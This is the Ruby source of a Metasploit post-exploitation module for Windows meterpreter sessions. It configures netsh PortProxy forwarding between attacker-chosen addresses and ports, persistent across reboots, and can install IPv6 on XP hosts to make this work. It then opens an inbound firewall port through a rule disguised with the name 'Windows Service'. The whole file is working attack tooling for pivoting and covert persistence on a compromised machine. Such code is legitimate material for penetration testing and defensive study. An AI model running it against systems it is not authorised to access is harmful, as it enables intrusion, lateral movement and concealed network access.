##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Priv
	include Msf::Post::Common

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Set Port Forwarding With PortProxy',
			'Description'   => %q{
				This module uses the PortProxy interface from netsh to set up
				port forwarding persistently (even after reboot). PortProxy
				supports TCP IPv4 and IPv6 connections.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptAddress.new('LADDRESS', [ true, 'IPv4/IPv6 address to which to listen.']),
				OptAddress.new('CADDRESS', [ true, 'IPv4/IPv6 address to which to connect.']),
				OptInt.new(    'CPORT',    [ true, 'Port number to which to connect.']),
				OptInt.new(    'LPORT',    [ true, 'Port number to which to listen.']),
				OptBool.new(   'IPV6_XP',  [ true, 'Install IPv6 on Windows XP (needed for v4tov4).', true]),
				OptEnum.new(   'TYPE',     [ true, 'Type of forwarding', 'v4tov4', ['v4tov4','v6tov6','v6tov4','v4tov6']])
			], self.class)
		end

	def run
		if not is_admin?
			print_error("You don't have enough privileges. Try getsystem.")
			return
		end

		type = datastore['TYPE']
		lport = datastore['LPORT']
		cport = datastore['CPORT']
		ipv6_xp = datastore['IPV6_XP']
		laddress = datastore['LADDRESS']
		caddress = datastore['CADDRESS']

		return unless enable_portproxy(lport,cport,laddress,caddress,type,ipv6_xp)
		fw_enable_ports(lport)

	end

	def enable_portproxy(lport,cport,laddress,caddress,type,ipv6_xp)
		rtable = Rex::Ui::Text::Table.new(
			'Header' => 'Port Forwarding Table',
			'Indent' =>  3,
			'Columns' => ['LOCAL IP', 'LOCAL PORT', 'REMOTE IP', 'REMOTE PORT']
		)

		# Due to a bug in Windows XP you need to install IPv6
		# http://support.microsoft.com/kb/555744/en-us
		if sysinfo["OS"] =~ /XP/
			return false if not check_ipv6(ipv6_xp)
		end

		print_status("Setting PortProxy ...")
		output = cmd_exec("netsh","interface portproxy add #{type} listenport=#{lport} listenaddress=#{laddress} connectport=#{cport} connectaddress=#{caddress}")
		if output.size > 2
			print_error("Setup error. Verify parameters and syntax.")
			return false
		else
			print_good("PortProxy added.")
		end

		output = cmd_exec("netsh","interface portproxy show all")
		output.each_line do |l|
			rtable << l.split(" ") if l.strip =~ /^[0-9]|\*/
		end
		print_status(rtable.to_s)
		return true
	end

	def ipv6_installed()
		output = cmd_exec("netsh","interface ipv6 show interface")
		if output.lines.count > 2
			return true
		else
			return false
		end
	end

	def check_ipv6(ipv6_xp)
		if ipv6_installed()
			print_status("IPv6 is already installed.")
			return true
		else
			if not ipv6_xp
				print_error("IPv6 is not installed. You need IPv6 to use portproxy.")
				return false
			else
				print_status("Installing IPv6 ...")
				cmd_exec("netsh","interface ipv6 install",120)
				if not ipv6_installed
					print_error("IPv6 was not successfully installed. Run it again.")
					return false
				end
				print_good("IPv6 was successfully installed.")
				return true
			end
		end
	end

	def fw_enable_ports(port)
		print_status ("Setting port #{port} in Windows Firewall ...")
		begin
			if sysinfo["OS"] =~ /Windows 7|Vista|2008|2012/
				cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{port}\"")
			else
				cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{port}\"")
			end
			output = cmd_exec("netsh","firewall show state")

			if  output =~ /^#{port} /
				print_good("Port opened in Windows Firewall.")
			else
				print_error("There was an error enabling the port.")
			end
		rescue ::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end
end